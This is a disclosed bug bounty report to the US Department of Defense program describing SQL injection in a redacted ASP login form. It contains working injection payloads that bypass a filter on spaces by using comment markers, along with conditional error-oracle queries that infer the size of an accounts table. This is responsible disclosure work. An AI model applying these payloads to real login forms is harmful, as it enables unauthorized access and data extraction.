# SQLi in login form of █████

## Report Details
- **Report ID**: 982202
- **URL**: https://hackerone.com/reports/982202
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2020-09-14T21:00:44.360Z
- **Disclosed**: 2020-09-29T20:28:46.838Z

## Reporter
- **Username**: erbbysam
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
## Summary
The following is vulnerable to a sqli, due to a limited char set this is t██████████y to demonstrate and not picked up by sqlmap.

```
POST /██████████.asp HTTP/█████.████
Host: ███████
```

## Description
```
POST /██████.asp HTTP/████.███
Host: █████
Connection: close
Content-Length: 45
Cache-Control: max-age=0
Upgr███████e-Insecure-Requests: ███
Origin: https://████
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X █████████0_████5_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4254.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?████████
Sec-Fetch-Dest: document
Referer: https://████████/wireless/index.asp
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: █████████████████

usr='/**/or/**/lastName!='&pwd=██████████
```

returns a 302 with a login error message, while an invalid column name returns a 500 error message. Note that spaces are not accepted, so I must replace them with `/**/`.

To summarize: 
`usr='/**/or/**/lastName!='&pwd=████████` -> 302
`usr='/**/or/**/abc!='&pwd=███` -> 500

case error g██████████get (which could be used to exfil data):
`usr=asdf'/**/and/**/lastName/**/in/**/(select/**/CASE/**/WHEN/**/(SELECT/**/count(*)/**/FROM/**/accounts)>███0000/**/THEN/**/'a'/**/ELSE/**/███/**/END)/**/and/**/usr!='&pwd=████` -> 302
`usr=asdf'/**/and/**/lastName/**/in/**/(select/**/CASE/**/WHEN/**/((SELECT/**/count(*)/**/FROM/**/accounts)<██████0000)/**/THEN/**/'a'/**/ELSE/**/████████/**/END)/**/and/**/usr!='&pwd=████████` -> 500

Using this, we can prove that there are 26 user accounts:
`usr=asdf'/**/and/**/lastName/**/in/**/(select/**/CASE/**/WHEN/**/((SELECT/**/count(*)/**/FROM/**/accounts)=500000)/**/THEN/**/'a'/**/ELSE/**/███████/**/END)/**/and/**/usr!='&pwd=████████` -> 302
`usr=asdf'/**/and/**/lastName/**/in/**/(select/**/CASE/**/WHEN/**/((SELECT/**/count(*)/**/FROM/**/accounts)=26)/**/THEN/**/'a'/**/ELSE/**/██████████/**/END)/**/and/**/usr!='&pwd=██████` -> 500

I have not exfiltrated any data with the exception of column names, the table name and the fact that there are 26 user accounts in this service.

**if you would like me to, I believe I can escalate this to allow me to login to this service, but I am not doing that without permission**

## Impact

SQLi, likely escalation to full service compromise

## Attachments
No attachments
